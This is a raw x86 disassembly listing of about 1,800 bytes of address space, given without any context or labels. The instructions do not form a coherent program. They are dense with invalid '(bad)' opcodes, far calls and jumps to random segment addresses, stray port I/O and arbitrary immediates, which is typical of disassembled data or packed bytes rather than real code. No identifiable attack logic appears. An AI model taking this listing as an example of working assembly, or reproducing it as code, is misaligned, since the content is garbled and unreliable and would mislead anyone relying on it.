  4202fc:	sbb    esi,DWORD PTR [edi+esi*8+0x23]
  420300:	outs   dx,DWORD PTR ds:[esi]
  420301:	fs pushf 
  420303:	mov    dh,0xec
  420305:	adc    esi,DWORD PTR [ecx]
  420307:	popf   
  420308:	mov    eax,0x497a75e3
  42030d:	data16 jo 0x420298
  420310:	pop    ecx
  420311:	fistp  WORD PTR [ebx-0xefcbabd]
  420317:	xchg   DWORD PTR [esi+0x24],ecx
  42031a:	call   0xf2e1:0xda0b0d8d
  420321:	jae    0x4202ff
  420323:	add    DWORD PTR [esi-0x4f37343f],esi
  420329:	fldcw  WORD PTR [edi+0x3f]
  42032c:	fisubr WORD PTR [eax]
  42032e:	pop    esi
  42032f:	test   eax,0xd94194c6
  420334:	mov    esp,0xe3a631f1
  420339:	mov    ecx,0xb68b6a03
  42033e:	jnp    0x420391
  420340:	shl    DWORD PTR ds:0xe61407c8,1
  420346:	jl     0x4202df
  420348:	jecxz  0x42031f
  42034a:	inc    ebx
  42034b:	aaa    
  42034c:	dec    edx
  42034d:	popf   
  42034e:	add    esp,DWORD PTR [esi]
  420350:	(bad)  
  420351:	dec    esi
  420352:	loop   0x4202f9
  420354:	push   edi
  420355:	leave  
  420356:	inc    esi
  420357:	inc    ebp
  420358:	test   BYTE PTR [edi+0xb],0x95
  42035c:	xchg   BYTE PTR [edx-0x18],bh
  42035f:	pop    esp
  420360:	and    eax,0x173cbf91
  420365:	into   
  420366:	and    DWORD PTR [ecx-0x34],0xffffff97
  42036a:	sbb    ch,ch
  42036c:	mov    bh,0x49
  42036e:	xor    al,0x85
  420370:	in     al,dx
  420371:	lar    esi,WORD PTR [ebp+0x6a]
  420375:	or     al,0x3a
  420377:	(bad)  
  420378:	sbb    eax,0x55151141
  42037d:	push   0xa3a95db9
  420382:	fimul  DWORD PTR [ebp+0x3f97397b]
  420388:	pop    edx
  420389:	pop    ebp
  42038a:	jbe    0x42032a
  42038c:	iret   
  42038d:	jmp    0xc0ec:0x87e35a82
  420394:	and    esp,eax
  420396:	pusha  
  420397:	sar    BYTE PTR [eax+0x49],cl
  42039a:	test   DWORD PTR [ecx+0x69],ecx
  42039d:	inc    ebp
  42039e:	test   al,0x51
  4203a0:	cld    
  4203a1:	into   
  4203a2:	jae    0x420388
  4203a4:	test   DWORD PTR [ebx+0x3a],eax
  4203a7:	in     eax,0xd0
  4203a9:	mov    eax,ds:0x82998d2
  4203ae:	or     edi,DWORD PTR [ecx]
  4203b0:	loope  0x42036a
  4203b2:	xchg   ecx,eax
  4203b3:	xchg   BYTE PTR [esi+0x7c105336],al
  4203b9:	add    BYTE PTR [eax+edi*2+0xbbe9acf],dl
  4203c0:	pop    esi
  4203c1:	nop
  4203c2:	mov    dh,0xc7
  4203c4:	es inc esi
  4203c6:	mov    BYTE PTR [esi-0x32a91a52],dl
  4203cc:	jmp    0x4203fb
  4203ce:	jl     0x420396
  4203d0:	inc    eax
  4203d1:	ss mov ecx,0xa075b67f
  4203d7:	inc    ebx
  4203d8:	dec    edx
  4203d9:	(bad)  
  4203da:	mov    ebx,0xf144b6a7
  4203df:	and    cl,BYTE PTR [ebx]
  4203e1:	loop   0x420455
  4203e3:	jne    0x420368
  4203e5:	or     esi,ebp
  4203e7:	add    BYTE PTR [ebx-0x47328145],bh
  4203ed:	fidiv  WORD PTR [edi-0x53]
  4203f0:	daa    
  4203f1:	retf   
  4203f2:	cmc    
  4203f3:	lods   al,BYTE PTR ds:[esi]
  4203f4:	push   0xa441774e
  4203f9:	into   
  4203fa:	sbb    edi,DWORD PTR [edi-0x26]
  4203fd:	mov    esi,edi
  4203ff:	sbb    BYTE PTR [ebx+0x64],bh
  420402:	bound  ebp,QWORD PTR [eax]
  420404:	jecxz  0x4203c5
  420406:	repz (bad) 
  420408:	mov    eax,0xb4faf42d
  42040d:	cld    
  42040e:	adc    dh,BYTE PTR [ebp-0x73c33dd]
  420414:	or     BYTE PTR [ecx-0x59],dl
  420417:	stos   DWORD PTR es:[edi],eax
  420418:	mov    esi,0xa245c8c
  42041d:	xchg   edx,eax
  42041e:	push   es
  42041f:	(bad)  
  420420:	repz pop esp
  420422:	xor    ah,BYTE PTR [edx-0x6a00f184]
  420428:	retf   
  420429:	and    al,0x5
  42042b:	mov    ecx,DWORD PTR [ebp-0xd]
  42042e:	or     al,0x28
  420430:	fistp  QWORD PTR [edx-0x3de0e7fc]
  420436:	cmc    
  420437:	stos   BYTE PTR es:[edi],al
  420438:	retf   0x6fc4
  42043b:	fadd   DWORD PTR ds:0xc2e91638
  420441:	(bad)  
  420443:	inc    ebx
  420444:	(bad)  [edx-0x7d]
  420447:	sbb    BYTE PTR [edi],0xc0
  42044a:	cmp    al,0x7b
  42044c:	loope  0x4203f1
  42044e:	or     al,0xae
  420450:	test   al,0x58
  420452:	cs dec ebx
  420454:	(bad)  
  420455:	(bad)  
  420456:	leave  
  420457:	adc    DWORD PTR [eax+eiz*1+0x2ebedeb4],ebx
  42045e:	and    bl,dh
  420460:	pop    ebp
  420461:	jns    0x42045d
  420463:	stos   DWORD PTR es:[edi],eax
  420464:	mov    bh,0xe9
  420466:	into   
  420467:	mov    ch,0xbc
  420469:	or     DWORD PTR [esi+0x617fb708],ecx
  42046f:	call   0x7097:0xd78c740b
  420476:	in     al,0xc7
  420478:	ss nop
  42047a:	mov    edx,0x99c76608
  42047f:	mov    cl,0xf5
  420481:	iret   
  420482:	sub    bl,BYTE PTR [ebx+0x59e0d948]
  420488:	les    esp,FWORD PTR [edi+0x7f]
  42048b:	(bad)  
  42048c:	sub    ebx,DWORD PTR [edi]
  42048e:	pusha  
  42048f:	dec    edx
  420490:	out    dx,eax
  420491:	xlat   BYTE PTR ds:[ebx]
  420492:	in     al,dx
  420493:	mov    cl,dl
  420495:	ins    DWORD PTR es:[edi],dx
  420496:	push   esp
  420497:	imul   esi,DWORD PTR [ecx-0x284edcf8],0xc1f5cce8
  4204a1:	idiv   BYTE PTR [eax]
  4204a3:	pop    esi
  4204a4:	mov    ebp,DWORD PTR [eax+0x2fa2d724]
  4204aa:	sbb    DWORD PTR [ebx],0x52
  4204ad:	sbb    esi,DWORD PTR [ecx-0x42]
  4204b0:	shl    edx,0xac
  4204b3:	sbb    esp,eax
  4204b5:	out    dx,al
  4204b6:	cld    
  4204b7:	push   0xffffffdb
  4204b9:	and    DWORD PTR [ebx-0x2e],0xc099c074
  4204c0:	cmc    
  4204c1:	int    0xf5
  4204c3:	ins    DWORD PTR es:[edi],dx
  4204c4:	rcr    BYTE PTR [edx-0x20],1
  4204c7:	jne    0x4204dc
  4204c9:	loop   0x420451
  4204cb:	repz sbb esp,0xffffffa7
  4204cf:	mov    al,ds:0x56eeba9f
  4204d4:	jns    0x420502
  4204d6:	jno    0x420459
  4204d8:	outs   dx,DWORD PTR ds:[esi]
  4204d9:	cmp    DWORD PTR [ebx],edx
  4204db:	cmp    al,0x74
  4204dd:	sbb    al,0x83
  4204df:	test   DWORD PTR [edx-0x13],edx
  4204e2:	sbb    DWORD PTR ss:[ecx+0x78],esi
  4204e6:	dec    esp
  4204e7:	stc    
  4204e8:	mov    al,0xb
  4204ea:	stos   BYTE PTR es:[edi],al
  4204eb:	aas    
  4204ec:	or     al,0x95
  4204ee:	arpl   di,ax
  4204f0:	jl     0x42050c
  4204f2:	iret   
  4204f3:	cmp    al,0x70
  4204f5:	daa    
  4204f6:	jg     0x420492
  4204f8:	test   BYTE PTR [edx],bh
  4204fa:	scas   eax,DWORD PTR es:[edi]
  4204fb:	lods   eax,DWORD PTR ds:[esi]
  4204fc:	sub    DWORD PTR [edi+0x21a7eed],0xf
  420503:	inc    ecx
  420504:	or     ecx,0xffffffd5
  420507:	scas   eax,DWORD PTR es:[edi]
  420508:	enter  0x8fbd,0x35
  42050c:	mov    eax,gs
  42050e:	lahf   
  42050f:	cwde   
  420510:	push   ss
  420511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420512:	or     ch,BYTE PTR [esi-0x15a718eb]
  420518:	test   al,0xd0
  42051a:	pop    ecx
  42051b:	push   edi
  42051c:	jp     0x4204a7
  42051e:	dec    eax
  42051f:	in     eax,dx
  420520:	fwait
  420521:	push   es
  420522:	inc    edi
  420523:	mov    eax,0xdf6395d1
  420528:	mov    dl,0xa9
  42052a:	(bad)  
  42052c:	add    al,0x72
  42052e:	enter  0x2a76,0xe4
  420532:	cmc    
  420533:	pop    ebx
  420534:	pop    edx
  420535:	or     bl,BYTE PTR [edx-0x27]
  420538:	pop    ss
  420539:	in     al,dx
  42053a:	jecxz  0x4205b2
  42053c:	test   BYTE PTR [eax],ah
  42053e:	mov    esi,0xb204ea16
  420543:	inc    edx
  420544:	sub    edi,DWORD PTR [edx-0x35e86ad8]
  42054a:	xchg   edx,eax
  42054b:	mov    dl,0x4d
  42054d:	sub    BYTE PTR [eax+eiz*8+0x39b53cc6],ch
  420554:	dec    edi
  420555:	je     0x42056b
  420557:	sub    DWORD PTR [ebx+0x75275aa9],eax
  42055d:	mov    dh,0xc3
  42055f:	mov    esi,0x396a1b79
  420564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420565:	(bad)  
  420566:	or     al,0x45
  420568:	pop    eax
  420569:	sub    eax,0xfdeba3c0
  42056e:	push   ebp
  42056f:	sbb    al,0xa8
  420571:	mov    cl,0xcd
  420573:	dec    ebx
  420574:	stos   BYTE PTR es:[edi],al
  420575:	or     esp,DWORD PTR [ebx]
  420577:	push   ss
  420578:	repnz pop ds
  42057a:	jmp    0x815:0x3aa7b7e2
  420581:	fwait
  420582:	in     al,0x72
  420584:	xor    al,0xfa
  420586:	pop    ecx
  420587:	sub    DWORD PTR [ebp-0x10ebc319],esi
  42058d:	int3   
  42058e:	jb     0x420542
  420590:	jnp    0x420514
  420592:	push   ecx
  420593:	out    dx,al
  420594:	out    dx,eax
  420595:	cs mov ecx,0xa85ae014
  42059b:	iret   
  42059c:	sbb    ah,BYTE PTR [edi-0x4b]
  42059f:	fs test esp,ecx
  4205a2:	pusha  
  4205a3:	jg     0x42054c
  4205a5:	sbb    BYTE PTR [ecx+edx*1-0x62feead1],dh
  4205ac:	daa    
  4205ad:	xlat   BYTE PTR ds:[ebx]
  4205ae:	xchg   ecx,eax
  4205af:	or     eax,0xc13ade39
  4205b4:	sbb    ebp,DWORD PTR [eax]
  4205b6:	jno    0x4205de
  4205b8:	out    dx,al
  4205b9:	shr    BYTE PTR [ebp+0x5eabdde0],0xa1
  4205c0:	loop   0x4205dd
  4205c2:	ss push ebx
  4205c4:	fsub   st(4),st
  4205c6:	mov    eax,ds:0x68ff973
  4205cb:	cld    
  4205cc:	mov    ecx,gs
  4205ce:	stos   BYTE PTR es:[edi],al
  4205cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205d0:	das    
  4205d1:	shr    cl,1
  4205d3:	(bad)  
  4205d4:	mov    ebx,0xdb93563f
  4205d9:	in     al,dx
  4205da:	and    DWORD PTR [eax+0x4280727f],0x5
  4205e1:	dec    esi
  4205e2:	outs   dx,DWORD PTR ds:[esi]
  4205e3:	std    
  4205e4:	outs   dx,BYTE PTR ds:[esi]
  4205e5:	and    BYTE PTR [edi+0x55],ah
  4205e8:	sub    DWORD PTR [edi],ebp
  4205ea:	xor    BYTE PTR ss:[eax],bl
  4205ed:	adc    eax,edx
  4205ef:	cs mov ecx,0x4625ebc3
  4205f5:	aas    
  4205f6:	je     0x420611
  4205f8:	dec    edx
  4205f9:	push   0x63
  4205fb:	cmp    al,0xd8
  4205fd:	inc    edx
  4205fe:	pop    es
  4205ff:	mov    eax,0xfe373f70
  420604:	mov    dl,0x98
  420606:	loopne 0x420613
  420608:	pop    ds
  420609:	ja     0x4205b1
  42060b:	test   ecx,edi
  42060d:	(bad)  
  42060e:	aam    0xa0
  420610:	pop    edi
  420611:	jo     0x4205f8
  420613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420614:	in     eax,0x4c
  420616:	ins    DWORD PTR es:[di],dx
  420618:	add    bl,dl
  42061a:	icebp  
  42061b:	mov    eax,0xf5f6b2f
  420620:	mov    ebx,0xc916702
  420625:	sbb    eax,DWORD PTR [esi-0x13f9dfc]
  42062b:	bound  ebp,QWORD PTR [edi+0x292c5e4a]
  420631:	push   esp
  420632:	xchg   BYTE PTR [eax-0x2b973f4],ah
  420638:	div    DWORD PTR [esi+0x63]
  42063b:	rcl    DWORD PTR [esi],0xf9
  42063e:	int3   
  42063f:	int    0x63
  420641:	jl     0x420633
  420643:	jg     0x42068c
  420645:	shl    esi,cl
  420647:	inc    edi
  420648:	sbb    al,0xff
  42064a:	mov    ds:0xeb416536,eax
  42064f:	push   ecx
  420650:	addr16 test al,0xb4
  420653:	xchg   DWORD PTR [ebp+0x79],ecx
  420656:	xchg   ebx,eax
  420657:	pop    ecx
  420658:	out    0x39,eax
  42065a:	and    dh,BYTE PTR [ecx+0x29f4cc54]
  420660:	cdq    
  420661:	stos   BYTE PTR es:[edi],al
  420662:	mov    ds:0x469a48d6,eax
  420667:	push   esi
  420668:	inc    ebx
  420669:	loopne 0x42060e
  42066b:	(bad)  
  42066c:	ss jl  0x4205ef
  42066f:	dec    eax
  420670:	test   BYTE PTR [ebx+0x5d],bh
  420673:	mov    ecx,0x67290e16
  420678:	cmp    eax,0x73486865
  42067d:	or     eax,0xa1b3fce9
  420682:	aam    0xe
  420684:	fisub  WORD PTR [eax-0x6f]
  420687:	mov    ds:0x4427deca,eax
  42068c:	sti    
  42068d:	call   0xdd41:0xbecbcf4b
  420694:	xor    al,0x2e
  420696:	addr16 pop esp
  420698:	adc    al,0xbd
  42069a:	mov    BYTE PTR [ebp+0x14],cl
  42069d:	and    eax,0x1bf4fcf3
  4206a2:	add    ecx,DWORD PTR [eax]
  4206a4:	mov    ebx,0x14ebaf80
  4206a9:	rcr    DWORD PTR [ebp+edi*2+0x604e32ca],cl
  4206b0:	adc    esp,DWORD PTR [ebx-0x5f]
  4206b3:	or     dh,BYTE PTR [edx-0x52378b8e]
  4206b9:	add    BYTE PTR [edi+esi*8+0xcb327a],dh
  4206c0:	inc    eax
  4206c1:	addr16 pushf 
  4206c3:	jp     0x4206db
  4206c5:	mov    ebp,0xbfbab205
  4206ca:	dec    esi
  4206cb:	push   es
  4206cc:	addr16 cmp al,0x90
  4206cf:	jne    0x42074c
  4206d1:	pop    DWORD PTR [edx]
  4206d3:	lea    ebx,es:0x296c2790
  4206da:	jmp    0xd7c8:0x93c34406
  4206e1:	jno    0x42067c
  4206e3:	aas    
  4206e4:	pop    ebx
  4206e5:	call   0xc7c0:0xac533b16
  4206ec:	dec    ebp
  4206ed:	out    0xad,al
  4206ef:	adc    al,BYTE PTR [edx+edx*2+0x53]
  4206f3:	stos   BYTE PTR es:[edi],al
  4206f4:	lea    esi,[ebx]
  4206f6:	jne    0x420710
  4206f8:	mov    ds:0x84afe297,al
  4206fd:	add    ah,bh
  4206ff:	dec    edx
  420700:	xor    DWORD PTR [eax+0x22],0xffffffff
  420704:	dec    esp
  420705:	and    BYTE PTR [eax],dh
  420707:	jmp    0x420748
  420709:	rcr    BYTE PTR [edi],cl
  42070b:	sbb    eax,ebp
  42070d:	xchg   ebx,eax
  42070e:	out    0xab,al
  420710:	icebp  
  420711:	and    eax,DWORD PTR [eax+ecx*8+0xb]
  420715:	in     al,dx
  420716:	jbe    0x4206a5
  420718:	dec    esi
  420719:	or     BYTE PTR [eax-0x1d],bl
  42071c:	jmp    0x2441:0x8a378d3a
  420723:	jmp    0xdb1:0x583207d8
  42072a:	mov    bh,0xad
  42072c:	pop    edx
  42072d:	push   ss
  42072e:	dec    ecx
  42072f:	mov    eax,0x9f4a0be9
  420734:	mov    ds:0x4b66bb3e,al
  420739:	sar    BYTE PTR [ebx+0x2b],cl
  42073c:	add    ebx,ebx
  42073e:	ja     0x4206fa
  420740:	das    
  420741:	jecxz  0x42075b
  420743:	in     eax,dx
  420744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420745:	push   edx
  420746:	jl     0x4206e1
  420748:	je     0x4206cb
  42074a:	push   esi
  42074b:	cmp    cl,BYTE PTR [eax]
  42074d:	adc    al,BYTE PTR [ecx-0x4b106ab4]
  420753:	fcom   QWORD PTR [ebx-0xb]
  420756:	inc    ecx
  420757:	scas   eax,DWORD PTR es:[edi]
  420758:	mov    ch,0xcb
  42075a:	(bad)  
  42075b:	enter  0x7664,0xa8
  42075f:	test   DWORD PTR [ecx+0x1e8c4ec4],0x311e4371
  420769:	lods   eax,DWORD PTR ds:[esi]
  42076a:	pop    ecx
  42076b:	sbb    esp,DWORD PTR [edx]
  42076d:	sbb    ch,ah
  42076f:	mov    dh,0x63
  420771:	dec    eax
  420773:	leave  
  420774:	imul   edx,DWORD PTR [edi+esi*4+0x3b7b2c7e],0x4f487c31
  42077f:	into   
  420780:	das    
  420781:	dec    eax
  420782:	test   edi,0x57f6b35
  420788:	cmp    esi,ebx
  42078a:	and    BYTE PTR [eax+eax*1+0x76b891d7],al
  420791:	sahf   
  420792:	setnp  BYTE PTR [eax]
  420795:	test   DWORD PTR [ecx],0xfd2f3ce1
  42079b:	pop    ebp
  42079c:	mov    es,WORD PTR [edi+esi*4]
  42079f:	or     eax,0x8ec0aa7d
  4207a4:	inc    esp
  4207a5:	add    ebp,esp
  4207a7:	mov    esi,0xb4f1d0a9
  4207ac:	xchg   edx,eax
  4207ad:	inc    edx
  4207ae:	cmp    eax,0x4018d30a
  4207b3:	or     al,0xd2
  4207b5:	jo     0x420823
  4207b7:	cmp    eax,ebx
  4207b9:	pop    ds
  4207ba:	mov    bl,0x56
  4207bc:	ud1    eax,DWORD PTR [ebp+esi*2-0x61]
  4207c1:	pop    es
  4207c2:	add    cl,bh
  4207c4:	cmp    al,0x43
  4207c6:	mov    ebx,0x4eaa434e
  4207cb:	sbb    DWORD PTR [esi],eax
  4207cd:	test   al,0x1f
  4207cf:	stos   DWORD PTR es:[edi],eax
  4207d0:	inc    edi
  4207d1:	lea    eax,[edx+ecx*8]
  4207d4:	lock shr DWORD PTR [edx+0x69],cl
  4207d8:	inc    esp
  4207d9:	es mov dl,0x9d
  4207dc:	mov    esp,0x29506110
  4207e1:	mov    cl,0x2f
  4207e3:	dec    esi
  4207e4:	fs sub al,0xed
  4207e7:	mov    ah,0x95
  4207e9:	(bad)  
  4207ea:	nop
  4207eb:	xchg   edi,eax
  4207ec:	jmp    0xf599f1da
  4207f1:	data16 cmp al,0x54
  4207f4:	leave  
  4207f5:	mov    al,ds:0x1f8f57ee
  4207fa:	mov    cl,0xc5
  4207fc:	xchg   edx,eax
  4207fd:	cmp    edi,DWORD PTR [edx+edx*4]
  420800:	xor    bh,ah
  420802:	inc    ecx
  420803:	adc    al,0x9a
  420805:	(bad)  
  420806:	xor    DWORD PTR [esi-0x16],ebp
  420809:	ja     0x420876
  42080b:	mov    ah,0x53
  42080d:	push   eax
  42080e:	push   eax
  42080f:	rol    DWORD PTR [ecx+0x21c47432],1
  420815:	das    
  420816:	mov    BYTE PTR [ebx-0x56549b43],cl
  42081c:	call   0x17cae8c2
  420821:	pop    ss
  420822:	jne    0x4207d5
  420824:	cmc    
  420825:	push   ebp
  420826:	bound  esp,QWORD PTR [esi+0x11]
  420829:	xor    eax,0x29037fba
  42082e:	andps  xmm5,XMMWORD PTR ds:0xa5cc228a
  420835:	imul   esi,DWORD PTR [ecx],0xffffffc6
  420838:	rcl    BYTE PTR [ebx+0x67],cl
  42083b:	push   edx
  42083c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42083d:	fild   WORD PTR ds:0x818c940e
  420843:	outs   dx,BYTE PTR ds:[esi]
  420844:	push   0xb2b9e744
  420849:	stc    
  42084a:	mov    ebx,0xf1e54901
  42084f:	pop    esp
  420850:	cmp    esi,DWORD PTR [esi+ebp*1]
  420853:	jnp    0x4207f9
  420855:	fld    QWORD PTR [esi-0x5d73b911]
  42085b:	push   ss
  42085c:	or     BYTE PTR [ebx+0x7f0746c4],dl
  420862:	mov    al,ds:0x680b4a34
  420867:	gs jl  0x420809
  42086a:	pop    edi
  42086b:	xchg   BYTE PTR [edx-0x19],bh
  42086e:	(bad)  
  42086f:	add    al,0x42
  420871:	iret   
  420872:	ja     0x420826
  420874:	mov    esp,edx
  420876:	push   esi
  420877:	xchg   esp,eax
  420878:	icebp  
  420879:	imul   DWORD PTR [ecx+0x53cafeca]
  42087f:	sahf   
  420880:	arpl   WORD PTR [eax],bp
  420882:	pushf  
  420883:	(bad)  
  420884:	loop   0x420850
  420886:	cmp    bl,BYTE PTR [edx-0x2be724d9]
  42088c:	push   edx
  42088d:	cmp    DWORD PTR [edi-0x1d],0x0
  420891:	lock mov esp,0xdfa23aa4
  420897:	leave  
  420898:	xchg   ebp,eax
  420899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42089a:	cmp    ch,BYTE PTR [esi+0x51faa3c3]
  4208a0:	jbe    0x4208ba
  4208a2:	cdq    
  4208a3:	mov    ah,0x40
  4208a5:	inc    esp
  4208a6:	sub    BYTE PTR [esi+0x62],0xbc
  4208aa:	stos   DWORD PTR es:[edi],eax
  4208ab:	das    
  4208ac:	or     BYTE PTR [eax+0x46211d5b],bh
  4208b2:	fbstp  TBYTE PTR ds:0xef6703df
  4208b8:	loope  0x420890
  4208ba:	rcr    BYTE PTR ds:0xd68f444c,1
  4208c0:	push   ebp
  4208c1:	inc    edx
  4208c2:	repz mov eax,0xa4310587
  4208c8:	mov    esi,0xd6608786
  4208cd:	cli    
  4208ce:	pop    es
  4208cf:	inc    ebx
  4208d0:	(bad)  
  4208d1:	mov    ?,WORD PTR [ecx+0x11]
  4208d4:	dec    ebp
  4208d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208d6:	and    cl,bh
  4208d8:	hlt    
  4208d9:	aad    0xca
  4208db:	jns    0x4208ac
  4208dd:	leave  
  4208de:	out    dx,al
  4208df:	arpl   bx,bx
  4208e1:	mov    cs,ebp
  4208e3:	test   BYTE PTR [ebp+0x15],dl
  4208e6:	push   eax
  4208e7:	mov    bh,0x4a
  4208e9:	lock inc esp
  4208eb:	test   eax,0x4edc8462
  4208f0:	jmp    0x7903daa6
  4208f5:	and    DWORD PTR [esi],ebx
  4208f7:	lahf   
  4208f8:	jnp    0x4208f3
  4208fa:	sbb    BYTE PTR gs:[esi+ecx*2],dl
  4208fe:	std    
  4208ff:	add    al,0x98
  420901:	test   eax,0x41d32bb1
  420906:	stc    
  420907:	adc    edi,DWORD PTR [edx+0x76]
  42090a:	or     eax,0xbf578b42
  42090f:	aaa    
  420910:	push   ds
  420911:	test   DWORD PTR [ebx-0x52],0x68f347fe
  420918:	loop   0x4208d7
  42091a:	sbb    bh,BYTE PTR [edi+0x4644ddb0]
  420920:	mov    ebp,0x6eb1655d
  420925:	shr    DWORD PTR [ebp-0x3f28873f],1
  42092b:	inc    ebx
  42092c:	neg    DWORD PTR [esi-0x2c074392]
  420932:	and    dl,BYTE PTR [edx-0x56d635eb]
  420938:	inc    eax
  420939:	cld    
  42093a:	js     0x4208bf
  42093c:	sbb    BYTE PTR [edx],ah
  42093e:	cwde   
  42093f:	jo     0x42090c
  420941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420942:	mov    edx,0xa09d6276
  420947:	imul   esi,DWORD PTR [edx],0xffffffd2
  42094a:	adc    DWORD PTR [esi-0x2fd26896],ecx
  420950:	xchg   ebp,eax
  420951:	dec    esi
  420952:	adc    BYTE PTR [eax],dh
  420954:	jg     0x42094f
  420956:	out    dx,eax
  420957:	in     al,dx
  420958:	jbe    0x42091a
  42095a:	sti    
  42095b:	(bad)
  42095e:	jmp    0xb26b6fff
  420963:	lds    ebp,FWORD PTR [eax+0x31009976]
  420969:	clc    
  42096a:	je     0x420947
  42096c:	hlt    
  42096d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42096e:	sub    BYTE PTR [eax+0x6dc219a6],bh
  420974:	cmp    eax,0xa942aa57
  420979:	cmc    
  42097a:	lahf   
  42097b:	mov    eax,ds:0xbd6ef668
  420980:	mov    al,0x93
  420982:	xchg   BYTE PTR [edx],ch
  420984:	pop    esp
  420985:	std    
  420986:	jae    0x420a03
  420988:	pop    ebx
  420989:	call   0xae66:0xb394757e
  420990:	sbb    al,0x8
  420992:	ins    DWORD PTR es:[edi],dx
  420993:	(bad)  
  420994:	loopne 0x42094a
  420996:	clc    
  420997:	cli    
  420998:	adc    ebx,DWORD PTR [ecx+0x6]
  42099b:	mov    ch,0x3
  42099d:	pop    esp
  42099e:	add    edx,DWORD PTR [edi]
  4209a0:	dec    edx
  4209a1:	cmp    eax,0xda63ad48
  4209a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209a7:	adc    BYTE PTR [ebp-0x516715bb],bh
  4209ad:	cmp    BYTE PTR [ebx-0x1e],bl
  4209b0:	pop    ds
  4209b1:	scas   al,BYTE PTR es:[edi]
  4209b2:	iret   
  4209b3:	scas   al,BYTE PTR es:[edi]
  4209b4:	push   esp
  4209b5:	rol    BYTE PTR [edi],0x34
  4209b8:	in     eax,0x36
  4209ba:	sub    ebp,DWORD PTR [esp+esi*1+0x1c]
  4209be:	clc    
  4209bf:	jle    0x42094c
  4209c1:	fwait
  4209c2:	repz dec esp
  4209c4:	jecxz  0x420a42
  4209c6:	mov    bl,0x1f
  4209c8:	mov    ah,0x29
  4209ca:	jecxz  0x42099e
  4209cc:	idiv   bl
  4209ce:	xor    bl,BYTE PTR [ebx+0x4f]
  4209d1:	mov    al,ds:0xcdd5fa96
  4209d6:	xchg   ebp,eax
  4209d7:	mov    dl,0xb8
  4209d9:	push   ecx
  4209da:	add    DWORD PTR [ebx+0xc],edx
  4209dd:	jns    0x420974
  4209df:	push   cs
  4209e0:	xlat   BYTE PTR ds:[ebx]
  4209e1:	adc    eax,0xff6e5bb5
  4209e6:	cmp    eax,0xf5ef6ef7
  4209eb:	adc    al,BYTE PTR [ebp-0x5144b17e]
  4209f1:	cdq    
  4209f2:	ja     0x4209fb
  4209f4:	data16 aam 0x1b
  4209f7:	hlt    
  4209f8:	je     0x420a24
  4209fa:	xchg   ecx,eax
  4209fb:	ins    DWORD PTR es:[edi],dx
  4209fc:	retf   0x89b0
  4209ff:	sub    edi,DWORD PTR ss:[ebp-0x5e8bc44e]
  420a06:	xchg   ecx,eax
  420a07:	call   0x3e99:0x9af863d9
  420a0e:	(bad)  
  420a0f:	(bad)  
  420a10:	jno    0x4209c4
  420a12:	stos   BYTE PTR es:[edi],al
  420a13:	inc    edi
  420a14:	pushf  
  420a15:	push   esp
  420a16:	and    BYTE PTR [eax-0xb6b61ae],0x18
  420a1d:	push   cs
  420a1e:	mov    edi,0x9015aabe
  420a23:	mov    WORD PTR [eax-0x55],gs
  420a26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a27:	jg     0x4209ea
  420a29:	addr16 fwait
  420a2b:	mov    dl,0xff
  420a2d:	dec    eax
  420a2e:	call   0xdecbc8c3
  420a33:	es repz repz jnp 0x420a35
  420a38:	or     ebx,0xffffff9d
  420a3b:	add    DWORD PTR [esi+0x5c],ebx
  420a3e:	mov    edi,0x37d63e6b
  420a43:	inc    ecx
  420a44:	and    ebx,esi
  420a46:	out    dx,eax
  420a47:	mov    dh,0x3f
  420a49:	cld    
  420a4a:	call   0x4d9e353e
  420a4f:	retf   
  420a50:	loopne 0x420a86
  420a52:	or     al,0x16
  420a54:	xor    DWORD PTR [edi+0x75],edi
  420a57:	das    
  420a58:	pop    ebx
  420a59:	cld    
  420a5a:	imul   esp,DWORD PTR [eax-0x61093c5c],0x476be853
  420a64:	mov    dh,0xf0
  420a66:	daa    
  420a67:	lock test al,0x3
  420a6a:	cmc    
  420a6b:	out    dx,eax
  420a6c:	jmp    0x420aca
  420a6e:	scas   eax,DWORD PTR es:[edi]
  420a6f:	loopne 0x420a57
  420a71:	cmp    al,0xa3
  420a73:	dec    ebp
  420a74:	jne    0x420ac4
  420a76:	shr    BYTE PTR [edi],cl
  420a78:	add    esp,DWORD PTR [ebx+0x39041a6]
  420a7e:	jno    0x420a64
  420a80:	push   ebx
  420a81:	repnz sub al,0x80
  420a84:	pop    esp
  420a85:	xchg   ebp,eax
  420a86:	enter  0xc972,0xf7
  420a8a:	jbe    0x420b02
  420a8c:	fild   QWORD PTR [eax-0x31]
  420a8f:	push   esi
  420a90:	dec    esi
  420a91:	mov    edi,esi
  420a93:	(bad)  
  420a94:	iretw  
  420a96:	add    BYTE PTR [ecx],ch
  420a98:	mov    bh,0x26
  420a9a:	es push ecx
  420a9c:	sbb    eax,0x6556fc0d
  420aa1:	and    BYTE PTR [ecx],dh
  420aa3:	push   ebp
  420aa4:	xor    al,0x2b
  420aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420aa7:	pusha  
  420aa8:	in     eax,dx
  420aa9:	retf   0x8d80
  420aac:	icebp  
  420aad:	pop    edx
  420aae:	mov    ah,0xce
  420ab0:	lds    ebx,FWORD PTR [ecx+0x3234c4fe]
  420ab6:	push   ds
  420ab7:	sti    
  420ab8:	lds    esi,FWORD PTR [ecx+0xcd6fadb]
  420abe:	imul   esi,DWORD PTR [edi+0x65d44f9b],0xffffffd4
  420ac5:	mov    esp,0xcde1ce52
  420aca:	test   DWORD PTR [esi-0x2eb57b3b],esi
  420ad0:	fst    st(7)
  420ad2:	in     al,0xa
  420ad4:	add    bh,BYTE PTR [edi-0x6908f862]
  420ada:	xchg   esi,eax
  420adb:	test   DWORD PTR [edx],edi
  420add:	push   esp
  420ade:	mov    esi,0x465968a
  420ae3:	scas   al,BYTE PTR es:[edi]
